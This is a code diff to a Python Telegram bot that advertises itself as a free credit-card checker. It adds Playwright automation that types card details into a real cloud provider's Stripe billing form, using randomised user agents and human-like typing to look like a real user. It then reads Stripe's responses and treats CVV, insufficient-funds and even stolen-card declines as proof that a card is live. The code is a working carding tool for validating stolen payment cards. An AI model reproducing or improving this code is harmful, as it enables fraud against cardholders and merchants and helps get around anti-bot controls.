@@ -3,7 +3,7 @@
 
 """
 Obeida Online - Free Multi Gateway CC Checker Bot
-Version: 22.0 - Enhanced Real Check Gateway
+Version: 22.0 - Enhanced Real Check Gateway with Stripe API Monitoring
 Author: @ObeidaOnline
 Channel: https://t.me/ObeidaTrading
 """
@@ -423,7 +423,7 @@ class StripeGateway:
         except Exception as e:
             return False, f"⚠️ خطأ"
 
-# ==================== بوابة Real Check (معدلة) ====================
+# ==================== بوابة Real Check (معدلة مع مراقبة Stripe API) ====================
 class RealCheckGateway:
     
     def __init__(self):
@@ -461,6 +461,10 @@ class RealCheckGateway:
         random_ua = random.choice(self.user_agents)
         random_viewport = random.choice(self.viewports)
         
+        # متغيرات لتخزين نتيجة الفحص
+        check_result = {"approved": None, "message": None}
+        check_complete = threading.Event()
+        
         try:
             async with async_playwright() as p:
                 browser = await p.chromium.launch(headless=True)
@@ -479,6 +483,87 @@ class RealCheckGateway:
                 email = self.generate_random_email()
                 password = "Obeida059@"
                 name = card_data.get('name', 'Card Holder')
+                
+                # مراقبة ردود Stripe API
+                async def handle_response(response):
+                    try:
+                        url = response.url()
+                        
+                        # التركيز على ردود Stripe المهمة
+                        if 'api.stripe.com' in url and ('payment_intents' in url or 'payment_methods' in url or 'confirm' in url):
+                            try:
+                                data = await response.json()
+                                
+                                # ✅ نجاح البطاقة
+                                if data.get('status') == 'succeeded':
+                                    check_result["approved"] = True
+                                    check_result["message"] = "✅ البطاقة مقبولة"
+                                    check_complete.set()
+                                    return
+                                
+                                # ❌ رفض البطاقة مع تحليل السبب
+                                if data.get('last_payment_error'):
+                                    error = data.get('last_payment_error')
+                                    error_code = error.get('code', '')
+                                    error_message = error.get('message', '').lower()
+                                    
+                                    # CVV خطأ (بطاقة حية)
+                                    if 'cvv' in error_message or 'security' in error_message or error_code == 'incorrect_cvc':
+                                        check_result["approved"] = True
+                                        check_result["message"] = "✅ البطاقة مقبولة"
+                                        check_complete.set()
+                                        return
+                                    
+                                    # رصيد غير كافي (بطاقة حية)
+                                    elif 'insufficient' in error_message or error_code == 'insufficient_funds':
+                                        check_result["approved"] = True
+                                        check_result["message"] = "✅ البطاقة مقبولة"
+                                        check_complete.set()
+                                        return
+                                    
+                                    # بطاقة مسروقة أو مفقودة (بطاقة حية)
+                                    elif 'stolen' in error_message or 'lost' in error_message:
+                                        check_result["approved"] = True
+                                        check_result["message"] = "✅ البطاقة مقبولة"
+                                        check_complete.set()
+                                        return
+                                    
+                                    # رفض عادي
+                                    else:
+                                        check_result["approved"] = False
+                                        check_result["message"] = "❌ البطاقة مرفوضة"
+                                        check_complete.set()
+                                        return
+                                
+                                # خطأ في إنشاء payment method
+                                if data.get('error'):
+                                    error = data.get('error')
+                                    error_code = error.get('code', '')
+                                    error_message = error.get('message', '').lower()
+                                    
+                                    if 'cvv' in error_message or 'security' in error_message:
+                                        check_result["approved"] = True
+                                        check_result["message"] = "✅ البطاقة مقبولة"
+                                        check_complete.set()
+                                        return
+                                    elif 'insufficient' in error_message:
+                                        check_result["approved"] = True
+                                        check_result["message"] = "✅ البطاقة مقبولة"
+                                        check_complete.set()
+                                        return
+                                    else:
+                                        check_result["approved"] = False
+                                        check_result["message"] = "❌ البطاقة مرفوضة"
+                                        check_complete.set()
+                                        return
+                                        
+                            except:
+                                pass
+                                
+                    except Exception as e:
+                        pass
+                
+                page.on('response', handle_response)
                 
                 await page.goto("https://cloud.vast.ai/create/", timeout=30000)
                 await asyncio.sleep(random.uniform(1.5, 2.5))
@@ -527,39 +612,38 @@ class RealCheckGateway:
                 await self.type_like_human(page, "#billingPostalCode", "90003")
                 await asyncio.sleep(random.uniform(0.3, 0.6))
                 
-                # التقاط رسائل الكونسول
-                console_messages = []
-                
-                async def handle_console(msg):
-                    console_messages.append(msg.text)
-                
-                page.on("console", handle_console)
-                
+                # الضغط على زر الإضافة
                 await page.locator('div.SubmitButton-IconContainer').click()
                 
-                # انتظار النتيجة
-                await asyncio.sleep(10)
+                # انتظار النتيجة من Stripe
+                await asyncio.sleep(2)
                 
-                # الحصول على معلومات الصفحة
+                # انتظار اكتمال الفحص (حد أقصى 20 ثانية)
+                try:
+                    await asyncio.wait_for(check_complete.wait(), timeout=20)
+                except:
+                    pass
+                
+                # الحصول على الصفحة الحالية للتحقق الإضافي
                 current_url = page.url
                 page_content = await page.content()
-                page_text = await page.text_content('body')
                 
                 await browser.close()
                 
-                # تحليل شامل
-                combined_text = (current_url + " " + page_text + " " + " ".join(console_messages)).lower()
+                # إذا تم الحصول على نتيجة من Stripe
+                if check_result["approved"] is not None:
+                    return check_result["approved"], check_result["message"]
+                
+                # تحليل إضافي من URL ومحتوى الصفحة
+                combined_text = (current_url + " " + page_content).lower()
                 
                 # كلمات النجاح
                 success_keywords = [
                     'billing?session_id=', 'payment method added', 'successfully added',
                     'card added', 'payment method saved', 'setup succeeded',
-                    'thank you', 'confirmation', 'completed', 'verified',
-                    'payment method', 'added successfully', 'card was added',
-                    'billing', 'payment-methods'
+                    'thank you', 'confirmation', 'completed'
                 ]
                 
-                # التحقق من النجاح
                 for keyword in success_keywords:
                     if keyword in combined_text:
                         return True, "✅ البطاقة مقبولة"
@@ -570,23 +654,16 @@ class RealCheckGateway:
                 if 'payment-methods' in current_url and 'billing' in current_url:
                     return True, "✅ البطاقة مقبولة"
                 
-                # التحقق من Stripe
                 if 'stripe.com' in current_url:
                     if 'cvv' in combined_text or 'security' in combined_text:
                         return True, "✅ البطاقة مقبولة"
                     if 'insufficient' in combined_text:
                         return True, "✅ البطاقة مقبولة"
-                    if 'error' not in combined_text and 'declined' not in combined_text:
-                        return True, "✅ البطاقة مقبولة"
-                
-                # التحقق من رسائل الكونسول
-                for msg in console_messages:
-                    if 'success' in msg.lower() or 'added' in msg.lower():
-                        return True, "✅ البطاقة مقبولة"
                 
                 return False, "❌ البطاقة مرفوضة"
                         
         except Exception as e:
+            print(f"⚠️ خطأ: {e}")
             return False, "❌ البطاقة مرفوضة"
 
 # ==================== بوابات الفحص ====================
@@ -963,59 +1040,9 @@ def run_web_server():
         class BotHandler(http.server.SimpleHTTPRequestHandler):
             def do_GET(self):
                 self.send_response(200)
-                self.send_header('Content-type', 'text/html; charset=utf-8')
+                self.send_header('Content-type', 'text/plain')
                 self.end_headers()
-                
-                html = f"""
-                <!DOCTYPE html>
-                <html>
-                <head>
-                    <title>Obeida Online Bot</title>
-                    <meta charset="UTF-8">
-                    <meta name="viewport" content="width=device-width, initial-scale=1">
-                    <style>
-                        body {{
-                            font-family: Arial, sans-serif;
-                            text-align: center;
-                            padding: 50px;
-                            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                            color: white;
-                            margin: 0;
-                        }}
-                        .container {{
-                            background: rgba(255,255,255,0.1);
-                            border-radius: 20px;
-                            padding: 30px;
-                            max-width: 500px;
-                            margin: auto;
-                            backdrop-filter: blur(10px);
-                        }}
-                        h1 {{ color: #fff; margin-bottom: 20px; }}
-                        .status {{ font-size: 24px; margin: 20px 0; }}
-                        .online {{ color: #4ade80; }}
-                        .time {{ font-size: 14px; opacity: 0.8; margin-top: 20px; }}
-                        hr {{ margin: 20px 0; border-color: rgba(255,255,255,0.2); }}
-                        .footer {{ font-size: 12px; opacity: 0.6; }}
-                    </style>
-                </head>
-                <body>
-                    <div class="container">
-                        <h1>🤖 Obeida Online Bot</h1>
-                        <div class="status">
-                            <span class="online">✅ البوت يعمل بشكل طبيعي</span>
-                        </div>
-                        <div class="time">
-                            🕐 الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-                        </div>
-                        <hr>
-                        <div class="footer">
-                            @ObeidaTrading | @Sz2zv
-                        </div>
-                    </div>
-                </body>
-                </html>
-                """
-                self.wfile.write(html.encode('utf-8'))
+                self.wfile.write(b'OK - Obeida Online Bot is running')
             
             def do_HEAD(self):
                 self.send_response(200)
@@ -1037,7 +1064,7 @@ def setup():
     handler = CommandHandler()
     callback = CallbackHandler(handler)
     
-    # تشغيل خادم الويب
+    # تشغيل خادم الويب في thread منفصل
     web_thread = threading.Thread(target=run_web_server, daemon=True)
     web_thread.start()
     
